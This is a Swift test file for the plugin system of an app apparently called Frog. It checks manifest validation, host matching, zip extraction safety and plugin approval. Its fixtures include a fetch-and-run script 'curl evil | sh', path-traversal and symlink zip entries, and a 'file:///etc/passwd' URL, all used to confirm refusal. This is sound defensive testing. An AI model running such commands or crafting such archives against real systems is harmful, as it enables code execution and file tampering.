import XCTest
@testable import FrogCore

final class PluginManifestTests: XCTestCase {
    private func manifest(_ fields: [String: Any]) throws -> PluginManifest {
        var json: [String: Any] = ["id": "com.example.counter", "name": "Counter", "version": "1.0.0", "description": "Counts things."]
        for (key, value) in fields { json[key] = value }
        return try PluginManifest.decode(JSONSerialization.data(withJSONObject: json))
    }

    private func assertInvalid(_ fields: [String: Any], mentions word: String, file: StaticString = #filePath, line: UInt = #line) {
        XCTAssertThrowsError(try manifest(fields), file: file, line: line) { error in
            XCTAssertTrue(error.localizedDescription.localizedCaseInsensitiveContains(word), "\(error.localizedDescription)", file: file, line: line)
        }
    }

    func testAMinimalManifestOpensIndexAndAsksForNothing() throws {
        let plugin = try manifest([:])
        XCTAssertEqual(plugin.entry, "index.html")
        XCTAssertEqual(plugin.permissions, [])
        XCTAssertEqual(plugin.displaySymbol, "puzzlepiece.extension")
        XCTAssertEqual(plugin.grant(scriptHashes: [:]), PluginGrant())
    }

    func testANullEntryNeedsCommands() throws {
        assertInvalid(["entry": NSNull()], mentions: "commands")
        let plugin = try manifest(["entry": NSNull(), "commands": [["id": "go", "title": "Go"]]])
        XCTAssertNil(plugin.entry)
        let encoded = try JSONSerialization.jsonObject(with: JSONEncoder().encode(plugin)) as? [String: Any]
        XCTAssertTrue(encoded?["entry"] is NSNull, "A plugin without a page keeps saying so")
    }

    func testIdsAreHostNames() {
        for id in ["Com.Example", "ab", "com..example", "-com.example", "com.example-", "com/example", "com.exämple", String(repeating: "a", count: 65)] {
            assertInvalid(["id": id], mentions: "id")
        }
        XCTAssertNoThrow(try manifest(["id": "word-counter"]))
        XCTAssertNoThrow(try manifest(["id": "xyz.beffa.frog.word-counter2"]))
    }

    func testUnknownPermissionsAndMismatchedHostsOrScriptsAreRefused() {
        assertInvalid(["permissions": ["camera"]], mentions: "Unknown permission")
        assertInvalid(["permissions": ["network"]], mentions: "hosts")
        assertInvalid(["hosts": ["api.github.com"]], mentions: "network")
        assertInvalid(["permissions": ["scripts"]], mentions: "scripts")
        assertInvalid(["scripts": ["go": "go.sh"]], mentions: "scripts permission")
        assertInvalid(["permissions": ["scripts"], "scripts": ["go": "../go.sh"]], mentions: "inside")
        assertInvalid(["permissions": ["notifications", "notifications"]], mentions: "twice")
    }

    func testHostsAreBareNamesAndWildcardsStayWithinADomain() {
        for host in ["https://api.github.com", "api.github.com/v1", "*.com", "API.github.com", "*", "localhost:99999", ""] {
            assertInvalid(["permissions": ["network"], "hosts": [host]], mentions: "host")
        }
        XCTAssertNoThrow(try manifest(["permissions": ["network"], "hosts": ["api.github.com", "*.example.com", "localhost:3000"]]))
    }

    func testHostMatching() throws {
        let exact = try XCTUnwrap(PluginHost("api.github.com"))
        XCTAssertTrue(exact.matches(URL(string: "https://api.github.com/repos")!))
        XCTAssertTrue(exact.matches(URL(string: "https://API.GitHub.com:443/")!))
        XCTAssertFalse(exact.matches(URL(string: "http://api.github.com/")!), "Plain http only reaches this Mac")
        XCTAssertFalse(exact.matches(URL(string: "https://api.github.com.evil.example/")!))
        XCTAssertFalse(exact.matches(URL(string: "https://evilapi.github.com/")!))
        XCTAssertFalse(exact.matches(URL(string: "https://api.github.com:8443/")!))

        let wildcard = try XCTUnwrap(PluginHost("*.example.com"))
        XCTAssertTrue(wildcard.matches(URL(string: "https://a.b.example.com/")!))
        XCTAssertFalse(wildcard.matches(URL(string: "https://example.com/")!))
        XCTAssertFalse(wildcard.matches(URL(string: "https://notexample.com/")!))

        let local = try XCTUnwrap(PluginHost("localhost:3000"))
        XCTAssertTrue(local.matches(URL(string: "http://localhost:3000/status")!))
        XCTAssertFalse(local.matches(URL(string: "http://localhost/status")!))
        XCTAssertFalse(PluginHost.allows(URL(string: "file:///etc/passwd")!, hosts: ["localhost"]))
    }

    func testCommandsNeedNamesAndTitles() {
        assertInvalid(["commands": [["id": "Go Now", "title": "Go"]]], mentions: "command id")
        assertInvalid(["commands": [["id": "go", "title": ""]]], mentions: "empty")
        assertInvalid(["commands": [["id": "go", "title": "Go"], ["id": "go", "title": "Again"]]], mentions: "same id")
    }

    func testVersionsCompareNumerically() throws {
        XCTAssertLessThan(try XCTUnwrap(PluginVersion("1.0.9")), try XCTUnwrap(PluginVersion("1.0.10")))
        XCTAssertNil(PluginVersion("1.0"))
        XCTAssertNil(PluginVersion("1.0.0-beta"))
        let plugin = try manifest(["frog": "1.0.40"])
        XCTAssertTrue(plugin.runs(on: "1.0.40"))
        XCTAssertTrue(plugin.runs(on: "1.1.0"))
        XCTAssertFalse(plugin.runs(on: "1.0.39"))
        XCTAssertTrue(plugin.runs(on: "development"))
    }

    func testAGrantCoversLessAndTheSameScriptsOnly() {
        let approved = PluginGrant(permissions: [.network, .scripts], hosts: ["a.example.com"], scripts: ["go": "aaa"])
        XCTAssertTrue(approved.covers(PluginGrant(permissions: [.network], hosts: ["a.example.com"])))
        XCTAssertTrue(approved.covers(PluginGrant(permissions: [.scripts], scripts: ["go": "aaa"])))
        XCTAssertFalse(approved.covers(PluginGrant(permissions: [.network, .ai], hosts: ["a.example.com"])))
        XCTAssertFalse(approved.covers(PluginGrant(permissions: [.network], hosts: ["b.example.com"])))
        XCTAssertFalse(approved.covers(PluginGrant(permissions: [.scripts], scripts: ["go": "bbb"])))
        let added = approved.additions(in: PluginGrant(permissions: [.network, .ai], hosts: ["a.example.com", "b.example.com"], scripts: ["go": "bbb"]))
        XCTAssertEqual(added.permissions, [.ai])
        XCTAssertEqual(added.hosts, ["b.example.com"])
        XCTAssertEqual(added.scripts, ["go"])
    }
}

/// Plugin folders in a temporary directory.
struct PluginFixture {
    let root: URL
    init() throws {
        root = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString, isDirectory: true)
        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
    }
    func remove() { try? FileManager.default.removeItem(at: root) }

    /// A plugin folder with `files` besides its manifest.
    func makePlugin(_ name: String = "plugin", manifest: [String: Any] = [:], files: [String: String] = ["index.html": "<h1>Hi</h1>"]) throws -> URL {
        let folder = root.appendingPathComponent(name, isDirectory: true)
        var json: [String: Any] = ["id": "com.example.counter", "name": "Counter", "version": "1.0.0", "description": "Counts things."]
        for (key, value) in manifest { json[key] = value }
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        try JSONSerialization.data(withJSONObject: json).write(to: folder.appendingPathComponent("plugin.json"))
        for (path, text) in files {
            let url = folder.appendingPathComponent(path)
            try FileManager.default.createDirectory(at: url.deletingLastPathComponent(), withIntermediateDirectories: true)
            try Data(text.utf8).write(to: url)
        }
        return folder
    }
}

final class PluginPackageTests: XCTestCase {
    private var fixture: PluginFixture!
    private var root: URL { fixture.root }
    override func setUpWithError() throws { fixture = try PluginFixture() }
    override func tearDown() { fixture.remove() }
    private func makePlugin(_ name: String = "plugin", manifest: [String: Any] = [:], files: [String: String] = ["index.html": "<h1>Hi</h1>"]) throws -> URL {
        try fixture.makePlugin(name, manifest: manifest, files: files)
    }

    func testReadingAFolderListsItsFilesWithoutHiddenOnesAndHashesScripts() throws {
        let folder = try makePlugin(manifest: ["permissions": ["scripts"], "scripts": ["stats": "scripts/stats.sh"]],
                                    files: ["index.html": "<p>", "app.js": "1", "scripts/stats.sh": "echo hi", ".git/config": "x", ".DS_Store": "x"])
        let package = try PluginPackage.read(folder)
        XCTAssertEqual(package.files.map(\.path), ["app.js", "index.html", "plugin.json", "scripts/stats.sh"])
        XCTAssertEqual(package.scriptHashes, ["stats": PluginPackage.sha256(Data("echo hi".utf8))])
        XCTAssertEqual(package.grant.scripts["stats"], package.scriptHashes["stats"])
        XCTAssertEqual(try package.scriptText("stats"), "echo hi")
    }

    func testAFolderWithALinkOrWithoutItsEntryIsRefused() throws {
        let folder = try makePlugin()
        try FileManager.default.createSymbolicLink(atPath: folder.appendingPathComponent("secrets").path, withDestinationPath: NSHomeDirectory())
        XCTAssertThrowsError(try PluginPackage.read(folder)) { XCTAssertTrue($0.localizedDescription.contains("symbolic link")) }

        let pageless = try makePlugin("pageless", files: ["app.js": ""])
        XCTAssertThrowsError(try PluginPackage.read(pageless)) { XCTAssertTrue($0.localizedDescription.contains("index.html")) }

        let missingScript = try makePlugin("script", manifest: ["permissions": ["scripts"], "scripts": ["go": "go.sh"]])
        XCTAssertThrowsError(try PluginPackage.read(missingScript)) { XCTAssertTrue($0.localizedDescription.contains("go.sh")) }
    }

    func testPackingAndUnpackingGivesTheSameFiles() throws {
        let big = String(repeating: "frog ", count: 5_000)
        let folder = try makePlugin(files: ["index.html": "<p>", "data/big.txt": big, "empty.css": ""])
        let package = try PluginPackage.read(folder)
        let archive = try PluginArchive.create(package)
        XCTAssertEqual(archive, try PluginArchive.create(package), "Packing is repeatable, so its SHA-256 is too")
        XCTAssertLessThan(archive.count, big.utf8.count, "Text is compressed")

        let unpacked = root.appendingPathComponent("unpacked")
        try PluginArchive.extract(archive, to: unpacked)
        let copy = try PluginPackage.read(unpacked)
        XCTAssertEqual(copy.files, package.files)
        XCTAssertEqual(try String(contentsOf: unpacked.appendingPathComponent("data/big.txt"), encoding: .utf8), big)
    }

    func testAZipOfTheFolderItselfUnpacksFromInsideIt() throws {
        let folder = try makePlugin("counter")
        let archive = root.appendingPathComponent("counter.zip")
        let zip = Process()
        zip.executableURL = URL(fileURLWithPath: "/usr/bin/zip")
        zip.currentDirectoryURL = root
        zip.arguments = ["-qr", archive.path, "counter"]
        try zip.run(); zip.waitUntilExit()
        XCTAssertEqual(zip.terminationStatus, 0)
        _ = folder
        let unpacked = root.appendingPathComponent("unpacked")
        try PluginArchive.extract(try Data(contentsOf: archive), to: unpacked)
        XCTAssertEqual(try PluginPackage.read(unpacked).files.map(\.path), ["index.html", "plugin.json"])
    }

    func testUnsafeArchivesAreRefusedAndWriteNothingOutside() throws {
        let manifest = Data(#"{"id":"com.example.counter","name":"Counter","version":"1.0.0","description":"Counts."}"#.utf8)
        let cases: [(String, [ZipEntry])] = [
            ("unsafe path", [ZipEntry("plugin.json", manifest), ZipEntry("../escaped.txt", Data("x".utf8))]),
            ("unsafe path", [ZipEntry("plugin.json", manifest), ZipEntry("/tmp/absolute.txt", Data("x".utf8))]),
            ("unsafe path", [ZipEntry("plugin.json", manifest), ZipEntry("a\\..\\b.txt", Data("x".utf8))]),
            ("symbolic link", [ZipEntry("plugin.json", manifest), ZipEntry("link", Data("/etc".utf8), mode: 0o120755)]),
            ("encrypted", [ZipEntry("plugin.json", manifest, flags: 1)]),
            ("damaged", [ZipEntry("plugin.json", manifest, crc: 1)]),
            ("no plugin.json", [ZipEntry("readme.txt", Data("x".utf8))]),
            ("twice", [ZipEntry("plugin.json", manifest), ZipEntry("Index.html", Data()), ZipEntry("index.html", Data())])
        ]
        for (index, (expected, entries)) in cases.enumerated() {
            let destination = root.appendingPathComponent("case\(index)/plugin")
            XCTAssertThrowsError(try PluginArchive.extract(ZipEntry.archive(entries), to: destination), expected) { error in
                XCTAssertTrue(error.localizedDescription.contains(expected), "\(expected): \(error.localizedDescription)")
            }
        }
        XCTAssertFalse(FileManager.default.fileExists(atPath: root.appendingPathComponent("escaped.txt").path))
        XCTAssertFalse(FileManager.default.fileExists(atPath: "/tmp/absolute.txt"))
        XCTAssertThrowsError(try PluginArchive.extract(Data("not a zip".utf8), to: root.appendingPathComponent("junk")))
    }

    func testMacResourceForkFilesAreSkipped() throws {
        let manifest = Data(#"{"id":"com.example.counter","name":"Counter","version":"1.0.0","description":"Counts."}"#.utf8)
        let archive = ZipEntry.archive([ZipEntry("plugin.json", manifest), ZipEntry("index.html", Data()),
                                        ZipEntry("__MACOSX/._index.html", Data("x".utf8)), ZipEntry("._plugin.json", Data("x".utf8))])
        let destination = root.appendingPathComponent("plugin")
        try PluginArchive.extract(archive, to: destination)
        XCTAssertEqual(try FileManager.default.contentsOfDirectory(atPath: destination.path).sorted(), ["index.html", "plugin.json"])
    }
}

final class PluginStoreTests: XCTestCase {
    private var packages: PluginFixture!
    private var root: URL { packages.root }
    private var store: PluginStore!

    override func setUpWithError() throws {
        packages = try PluginFixture()
        store = PluginStore(directory: root.appendingPathComponent("Plugins"))
    }
    override func tearDown() { packages.remove() }

    func testAFirstInstallWaitsForReviewAndAnUpdateAskingForNothingNewKeepsTheApproval() throws {
        let first = try PluginPackage.read(packages.makePlugin("v1", manifest: ["permissions": ["clipboard-read"]]))
        var record = try store.install(first, source: .folder("/tmp/v1"))
        XCTAssertNil(record.approved)
        XCTAssertFalse(record.enabled)
        XCTAssertThrowsError(try store.setEnabled(first.manifest.id, true), "Only a review turns it on")

        try store.approve(first.manifest.id)
        record = try XCTUnwrap(store.record(first.manifest.id))
        XCTAssertEqual(record.approved, first.grant)
        XCTAssertTrue(record.enabled)

        let same = try PluginPackage.read(packages.makePlugin("v2", manifest: ["version": "1.1.0", "permissions": ["clipboard-read"]],
                                                              files: ["index.html": "<p>new</p>"]))
        record = try store.install(same, source: .folder("/tmp/v2"))
        XCTAssertTrue(try XCTUnwrap(record.approved).covers(same.grant))
        XCTAssertEqual(try store.package(same.manifest.id).manifest.version, "1.1.0")
        XCTAssertEqual(try String(contentsOf: store.folder(for: same.manifest.id).appendingPathComponent("index.html"), encoding: .utf8), "<p>new</p>")

        let more = try PluginPackage.read(packages.makePlugin("v3", manifest: ["version": "1.2.0", "permissions": ["clipboard-read", "network"], "hosts": ["api.example.com"]]))
        record = try store.install(more, source: .folder("/tmp/v3"))
        XCTAssertFalse(try XCTUnwrap(record.approved).covers(more.grant), "An update asking for more waits for review")
    }

    func testAChangedScriptNeedsReviewAgain() throws {
        let manifest: [String: Any] = ["permissions": ["scripts"], "scripts": ["go": "go.sh"]]
        let first = try PluginPackage.read(packages.makePlugin("a", manifest: manifest, files: ["index.html": "", "go.sh": "echo one"]))
        try store.install(first, source: .folder("/tmp/a"), approving: true)
        let changed = try PluginPackage.read(packages.makePlugin("b", manifest: manifest, files: ["index.html": "", "go.sh": "curl evil | sh"]))
        let record = try store.install(changed, source: .folder("/tmp/b"))
        XCTAssertFalse(try XCTUnwrap(record.approved).covers(changed.grant))
    }

    func testRemovingTrashesTheFilesAndTheStorage() throws {
        let package = try PluginPackage.read(packages.makePlugin())
        try store.install(package, source: .folder("/tmp/p"), approving: true)
        let storage = PluginStorage(folder: store.dataFolder(for: package.manifest.id))
        try storage.set("count", json: "3")
        var trashed: [String] = []
        try store.remove(package.manifest.id) { url in trashed.append(url.lastPathComponent); try FileManager.default.removeItem(at: url) }
        XCTAssertEqual(trashed, [package.manifest.id, package.manifest.id])
        XCTAssertNil(try store.record(package.manifest.id))
        XCTAssertThrowsError(try store.remove("../../Documents"))
    }

    func testUnpackingAnArchiveReadsItWithoutInstalling() throws {
        let package = try PluginPackage.read(packages.makePlugin())
        let unpacked = try store.unpack(PluginArchive.create(package), in: root.appendingPathComponent("Staging"))
        XCTAssertEqual(unpacked.manifest, package.manifest)
        XCTAssertEqual(try store.records(), [])
    }

    func testStorageKeepsJSONTextWithinItsLimit() throws {
        let storage = PluginStorage(folder: root.appendingPathComponent("data"))
        XCTAssertNil(try storage.get("missing"))
        try storage.set("list", json: "[1,2]")
        try storage.set("name", json: "\"Frog\"")
        XCTAssertEqual(try PluginStorage(folder: root.appendingPathComponent("data")).get("list"), "[1,2]", "Stored values survive a restart")
        XCTAssertEqual(try storage.keys(), ["list", "name"])
        try storage.set("list", json: nil)
        XCTAssertEqual(try storage.keys(), ["name"])
        XCTAssertThrowsError(try storage.set("big", json: String(repeating: "x", count: PluginStorage.maximumBytes)))
        XCTAssertThrowsError(try storage.set("", json: "1"))
    }
}

/// A stored zip entry with any name, mode or flags, for archives Frog must refuse.
struct ZipEntry {
    let name: String
    let data: Data
    var mode: UInt32 = 0o100644
    var flags: UInt16 = 0
    var crc: UInt32?

    init(_ name: String, _ data: Data, mode: UInt32 = 0o100644, flags: UInt16 = 0, crc: UInt32? = nil) {
        self.name = name; self.data = data; self.mode = mode; self.flags = flags; self.crc = crc
    }

    static func archive(_ entries: [ZipEntry]) -> Data {
        var archive = Data(), directory = Data()
        func u16(_ value: UInt16, _ data: inout Data) { data.append(contentsOf: [UInt8(value & 0xFF), UInt8(value >> 8)]) }
        func u32(_ value: UInt32, _ data: inout Data) { for shift in stride(from: 0, to: 32, by: 8) { data.append(UInt8((value >> UInt32(shift)) & 0xFF)) } }
        for entry in entries {
            let name = Data(entry.name.utf8)
            let crc = entry.crc ?? CRC32.checksum(entry.data)
            let offset = UInt32(archive.count)
            u32(0x0403_4b50, &archive); u16(20, &archive); u16(entry.flags, &archive); u16(0, &archive); u16(0, &archive); u16(0x21, &archive)
            u32(crc, &archive); u32(UInt32(entry.data.count), &archive); u32(UInt32(entry.data.count), &archive)
            u16(UInt16(name.count), &archive); u16(0, &archive)
            archive.append(name); archive.append(entry.data)
            u32(0x0201_4b50, &directory); u16(0x0314, &directory); u16(20, &directory); u16(entry.flags, &directory); u16(0, &directory)
            u16(0, &directory); u16(0x21, &directory)
            u32(crc, &directory); u32(UInt32(entry.data.count), &directory); u32(UInt32(entry.data.count), &directory)
            u16(UInt16(name.count), &directory); u16(0, &directory); u16(0, &directory); u16(0, &directory); u16(0, &directory)
            u32(entry.mode << 16, &directory); u32(offset, &directory)
            directory.append(name)
        }
        let start = UInt32(archive.count)
        archive.append(directory)
        u32(0x0605_4b50, &archive); u16(0, &archive); u16(0, &archive)
        u16(UInt16(entries.count), &archive); u16(UInt16(entries.count), &archive)
        u32(UInt32(directory.count), &archive); u32(start, &archive); u16(0, &archive)
        return archive
    }
}
